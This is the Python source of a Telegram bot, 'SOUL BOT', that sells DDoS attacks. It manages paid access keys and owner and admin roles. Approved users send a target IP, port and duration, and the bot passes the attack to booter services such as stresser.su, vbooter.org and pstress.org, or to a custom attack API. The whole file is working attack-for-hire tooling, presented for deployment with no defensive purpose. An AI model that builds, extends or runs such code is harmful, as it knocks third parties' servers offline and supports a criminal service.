"""
SOUL BOT - Railway Optimized Version with Multiple Stresser Support
No browser required - Direct API calls
"""

import asyncio
import logging
import os
import json
import string
import random
import sys
import aiohttp
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# --- Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("OWNER_ID", "0"))

# Stresser Service Configuration
# Choose one service and set its API key:
# Option 1: stresser.su
# Option 2: pstress.org  
# Option 3: vbooter.org
# Option 4: Custom API

SERVICE_TYPE = os.environ.get("SERVICE_TYPE", "stresser")  # stresser, vbooter, pstress, custom
API_KEY = os.environ.get("API_KEY", "")
CUSTOM_API_URL = os.environ.get("CUSTOM_API_URL", "")

# Data files
DATA_JSON = "users_data.json"

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Global variables
user_state = {}
data = {
    "approved_users": {},
    "admins": {},
    "keys": {},
    "disapproved_users": []
}

# --- Data Management Functions ---
def load_data():
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON, 'r') as f:
                data = json.load(f)
            logger.info(f"Data loaded: {len(data.get('approved_users', {}))} users")
    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
        logger.info("Data saved")
    except Exception as e:
        logger.error(f"Error saving data: {e}")

def generate_random_key():
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(20))

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    if str(user_id) in data.get("admins", {}):
        expiry_str = data["admins"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                del data["admins"][str(user_id)]
                save_data()
        except:
            pass
    return False

def is_approved(user_id):
    if is_admin(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        expiry_str = data["approved_users"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                del data["approved_users"][str(user_id)]
                save_data()
        except:
            pass
    return False

# --- API Attack Functions for Different Services ---
async def send_attack_stresser(ip, port, duration):
    """Send attack via stresser.su API"""
    try:
        headers = {
            "Authorization": f"Bearer {API_KEY}",
            "Content-Type": "application/json"
        }
        payload = {
            "host": ip,
            "port": int(port),
            "time": int(duration),
            "method": "TCP"
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://api.stresser.su/v1/attack",
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    return True, f"Attack sent! ID: {result.get('id', 'N/A')}"
                elif response.status == 401:
                    return False, "Invalid API key"
                elif response.status == 403:
                    return False, "Insufficient balance or plan"
                else:
                    text = await response.text()
                    return False, f"Error: {text[:100]}"
    except Exception as e:
        return False, f"Connection error: {str(e)[:100]}"

async def send_attack_vbooter(ip, port, duration):
    """Send attack via vbooter.org API"""
    try:
        payload = {
            "key": API_KEY,
            "host": ip,
            "port": int(port),
            "time": int(duration),
            "method": "TCP"
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://api.vbooter.org/v1/attack",
                data=payload,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as response:
                if response.status == 200:
                    return True, "Attack started successfully"
                else:
                    text = await response.text()
                    return False, f"Error: {text[:100]}"
    except Exception as e:
        return False, f"Connection error: {str(e)[:100]}"

async def send_attack_pstress(ip, port, duration):
    """Send attack via pstress.org API"""
    try:
        headers = {
            "api-key": API_KEY,
            "Content-Type": "application/json"
        }
        payload = {
            "target": ip,
            "port": int(port),
            "time": int(duration)
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://api.pstress.org/v1/attack",
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as response:
                if response.status == 200:
                    return True, "Attack launched successfully"
                else:
                    text = await response.text()
                    return False, f"Error: {text[:100]}"
    except Exception as e:
        return False, f"Connection error: {str(e)[:100]}"

async def send_attack_custom(ip, port, duration):
    """Send attack via custom API"""
    try:
        headers = {
            "Authorization": f"Bearer {API_KEY}",
            "Content-Type": "application/json"
        }
        payload = {
            "ip": ip,
            "port": int(port),
            "time": int(duration)
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(
                CUSTOM_API_URL,
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as response:
                if response.status == 200:
                    return True, "Attack sent successfully"
                else:
                    text = await response.text()
                    return False, f"Error: {text[:100]}"
    except Exception as e:
        return False, f"Connection error: {str(e)[:100]}"

async def send_attack(ip, port, duration):
    """Route attack to selected service"""
    if SERVICE_TYPE == "stresser":
        return await send_attack_stresser(ip, port, duration)
    elif SERVICE_TYPE == "vbooter":
        return await send_attack_vbooter(ip, port, duration)
    elif SERVICE_TYPE == "pstress":
        return await send_attack_pstress(ip, port, duration)
    elif SERVICE_TYPE == "custom" and CUSTOM_API_URL:
        return await send_attack_custom(ip, port, duration)
    else:
        return False, f"Unknown service type: {SERVICE_TYPE}"

# --- Keyboard Builders ---
def get_owner_keyboard():
    keyboard = [
        [InlineKeyboardButton("📊 Check Status", callback_data="check")],
        [InlineKeyboardButton("✅ Approve User", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove User", callback_data="disapprove")],
        [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
         InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 View Stats", callback_data="stats")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("✅ Approve User", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove User", callback_data="disapprove")],
        [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
         InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 View Stats", callback_data="stats")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_approved_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 My Status", callback_data="my_status")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎟️ Redeem Key", callback_data="redeem_key")]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- Command Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"

    welcome_msg = f"👋 **Welcome {user_name}!**\n\n"

    if is_owner(user_id):
        welcome_msg += "🔑 **You are the Owner**\n"
        keyboard = get_owner_keyboard()
    elif is_admin(user_id):
        welcome_msg += "👮 **You are an Admin**\n"
        keyboard = get_admin_keyboard()
    elif is_approved(user_id):
        welcome_msg += "✅ **You are Approved**\n"
        keyboard = get_approved_keyboard()
    else:
        welcome_msg += "📌 **Welcome to the Bot**\nRedeem a key to get access.\n\n"
        keyboard = get_user_keyboard()

    welcome_msg += f"\n🔧 **Service:** {SERVICE_TYPE.upper()}\n"
    welcome_msg += f"🔑 **API Key:** {'✓ Set' if API_KEY else '✗ Not set'}"

    await update.message.reply_text(welcome_msg, parse_mode='Markdown', reply_markup=keyboard)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    callback_data = query.data

    if callback_data == "check":
        if not is_owner(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        await check_status(query.message)
        return

    elif callback_data == "approve":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'approve', 'step': 'awaiting_id'}
        await query.message.reply_text("✅ Approve User\n\nSend: `<user_id> <days>`", parse_mode='Markdown')
        return

    elif callback_data == "disapprove":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'disapprove', 'step': 'awaiting_id'}
        await query.message.reply_text("❌ Disapprove User\n\nSend user ID:", parse_mode='Markdown')
        return

    elif callback_data == "add_admin":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'add_admin', 'step': 'awaiting_id'}
        await query.message.reply_text("👮 Add Admin\n\nSend: `<user_id> <days>`", parse_mode='Markdown')
        return

    elif callback_data == "remove_admin":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'remove_admin', 'step': 'awaiting_id'}
        await query.message.reply_text("🚫 Remove Admin\n\nSend user ID:", parse_mode='Markdown')
        return

    elif callback_data == "gen_key":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'gen_key', 'step': 'awaiting_days'}
        await query.message.reply_text("🎟️ Generate Key\n\nSend number of days:", parse_mode='Markdown')
        return

    elif callback_data == "run":
        if not is_approved(user_id):
            await query.message.reply_text("❌ Not authorized. Please redeem a key first.")
            return
        user_state[user_id] = {'action': 'run', 'step': 'awaiting_params'}
        await query.message.reply_text("🚀 Run Attack\n\nSend: `<IP> <PORT> <TIME>`\nExample: `1.1.1.1 80 60`", parse_mode='Markdown')
        return

    elif callback_data == "stats":
        await show_stats(query.message, user_id)
        return

    elif callback_data == "my_status":
        await show_my_status(query.message, user_id)
        return

    elif callback_data == "redeem_key":
        user_state[user_id] = {'action': 'redeem', 'step': 'awaiting_key'}
        await query.message.reply_text("🎟️ Redeem Key\n\nSend your access key:", parse_mode='Markdown')
        return

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id not in user_state:
        await update.message.reply_text("ℹ️ Use /start to see options.")
        return

    action = user_state[user_id].get('action')

    if action == 'approve':
        await process_approve(update, text)
    elif action == 'disapprove':
        await process_disapprove(update, text)
    elif action == 'add_admin':
        await process_add_admin(update, text)
    elif action == 'remove_admin':
        await process_remove_admin(update, text)
    elif action == 'gen_key':
        await process_gen_key(update, text)
    elif action == 'run':
        await process_run(update, text)
    elif action == 'redeem':
        await process_redeem(update, text)

async def process_approve(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: user_id days")
            return

        target_id, days = parts[0], int(parts[1])
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["approved_users"][target_id] = {
            "expiry": expiry_date,
            "approved_by": user_id
        }

        if int(target_id) in data.get("disapproved_users", []):
            data["disapproved_users"].remove(int(target_id))

        save_data()
        await update.message.reply_text(f"✅ User Approved!\nID: {target_id}\nExpires: {expiry_date}")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_disapprove(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        target_id = int(text.strip())

        if str(target_id) in data.get("approved_users", {}):
            del data["approved_users"][str(target_id)]

        if target_id not in data.get("disapproved_users", []):
            data["disapproved_users"].append(target_id)

        save_data()
        await update.message.reply_text(f"❌ User {target_id} disapproved!")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_add_admin(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: user_id days")
            return

        target_id, days = parts[0], int(parts[1])
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["admins"][target_id] = {
            "expiry": expiry_date,
            "added_by": user_id
        }

        save_data()
        await update.message.reply_text(f"👮 Admin Added!\nID: {target_id}\nExpires: {expiry_date}")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_remove_admin(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        target_id = text.strip()
        if target_id in data.get("admins", {}):
            del data["admins"][target_id]
            save_data()
            await update.message.reply_text(f"🚫 Admin {target_id} removed!")
        else:
            await update.message.reply_text(f"User {target_id} is not an admin.")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_gen_key(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        days = int(text.strip())
        key = generate_random_key()

        data["keys"][key] = {
            "days": days,
            "created_by": user_id,
            "redeemed": False,
            "redeemed_by": None
        }

        save_data()
        await update.message.reply_text(
            f"🎟️ Key Generated!\n🔑 `{key}`\n📅 Valid for: {days} days\n\n"
            f"Share this key with users to grant access.",
            parse_mode='Markdown'
        )
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_run(update: Update, text: str):
    user_id = update.effective_user.id

    if not API_KEY:
        await update.message.reply_text("❌ API Key not configured. Please contact owner.")
        return

    try:
        parts = text.strip().split()
        if len(parts) != 3:
            await update.message.reply_text("❌ Invalid format. Use: IP PORT TIME\nExample: 1.1.1.1 80 60")
            return

        ip, port, duration = parts

        # Validate inputs
        if not ip.replace('.', '').replace(':', '').isalnum():
            await update.message.reply_text("❌ Invalid IP address format.")
            return
        
        try:
            port = int(port)
            duration = int(duration)
            if port < 1 or port > 65535:
                await update.message.reply_text("❌ Port must be between 1 and 65535.")
                return
            if duration < 1 or duration > 3600:
                await update.message.reply_text("❌ Duration must be between 1 and 3600 seconds.")
                return
        except ValueError:
            await update.message.reply_text("❌ Port and Time must be numbers.")
            return

        await update.message.reply_text(f"⚡ Sending attack to {ip}:{port} for {duration}s...")

        # Send attack via selected service
        success, message = await send_attack(ip, port, duration)

        if success:
            await update.message.reply_text(
                f"🚀 **Attack Started!**\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"🔧 Service: {SERVICE_TYPE.upper()}\n\n"
                f"📡 {message}",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(f"❌ **Attack Failed!**\n\n{message}")

        user_state.pop(user_id, None)

    except Exception as e:
        logger.error(f"Attack error: {e}")
        await update.message.reply_text(f"❌ Attack Failed: {str(e)[:100]}")

async def process_redeem(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        key = text.strip()

        if key not in data.get("keys", {}):
            await update.message.reply_text("❌ Invalid key.")
            user_state.pop(user_id, None)
            return

        key_data = data["keys"][key]

        if key_data.get("redeemed"):
            await update.message.reply_text("❌ Key already redeemed.")
            user_state.pop(user_id, None)
            return

        days = key_data.get("days", 0)
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["approved_users"][str(user_id)] = {
            "expiry": expiry_date,
            "approved_by": "key_redemption"
        }

        data["keys"][key]["redeemed"] = True
        data["keys"][key]["redeemed_by"] = user_id

        save_data()
        await update.message.reply_text(
            f"🎉 **Key Redeemed Successfully!**\n\n"
            f"✅ You now have access!\n"
            f"📅 Valid for: {days} days\n"
            f"⏰ Expires: {expiry_date}\n\n"
            f"🚀 Use /start to see your options.",
            parse_mode='Markdown'
        )
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def check_status(message):
    status_msg = (
        f"✅ **Bot Status**\n\n"
        f"🔧 Service: {SERVICE_TYPE.upper()}\n"
        f"🔑 API Key: {'✓ Configured' if API_KEY else '✗ Missing'}\n"
        f"📡 Status: {'Ready' if API_KEY else 'Waiting for API key'}\n\n"
        f"💡 Send `IP PORT TIME` to run an attack.\n"
        f"📝 Example: `1.1.1.1 80 60`"
    )
    await message.reply_text(status_msg, parse_mode='Markdown')

async def show_stats(message, user_id):
    approved_count = len(data.get("approved_users", {}))
    admin_count = len(data.get("admins", {}))
    key_count = len(data.get("keys", {}))
    redeemed_count = sum(1 for k in data.get("keys", {}).values() if k.get("redeemed"))
    disapproved_count = len(data.get("disapproved_users", []))

    stats_msg = (
        f"📊 **System Statistics**\n\n"
        f"✅ Approved Users: {approved_count}\n"
        f"👮 Admins: {admin_count}\n"
        f"🎟️ Total Keys: {key_count}\n"
        f"✔ Redeemed Keys: {redeemed_count}\n"
        f"❌ Disapproved Users: {disapproved_count}\n\n"
        f"🔄 Last Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

    await message.reply_text(stats_msg, parse_mode='Markdown')

async def show_my_status(message, user_id):
    if str(user_id) in data.get("approved_users", {}):
        expiry = data["approved_users"][str(user_id)].get("expiry")
        time_left = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"✅ Status: Approved\n"
            f"⏰ Expires: {expiry}\n"
            f"📅 {time_left} days remaining"
        )
    elif str(user_id) in data.get("admins", {}):
        expiry = data["admins"][str(user_id)].get("expiry")
        time_left = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"👮 Status: Admin\n"
            f"⏰ Expires: {expiry}\n"
            f"📅 {time_left} days remaining"
        )
    elif is_owner(user_id):
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"🔑 Status: Owner\n"
            f"♾️ Access: Unlimited"
        )
    else:
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"❌ Status: No Access\n"
            f"💡 Redeem a key to get access!"
        )

    await message.reply_text(status_msg, parse_mode='Markdown')

# --- Main Function ---
async def run_bot():
    load_data()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logger.info("=== SOUL BOT STARTED ===")
    logger.info(f"Owner ID: {OWNER_ID}")
    logger.info(f"Service Type: {SERVICE_TYPE}")
    logger.info(f"API Key: {'Set' if API_KEY else 'Not set'}")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    logger.info("Bot is polling for updates...")
    
    try:
        while True:
            await asyncio.sleep(60)
            save_data()
            logger.info("Heartbeat: Bot is running")
    except asyncio.CancelledError:
        logger.info("Bot stopped")
    finally:
        await app.stop()
        await app.shutdown()

def main():
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()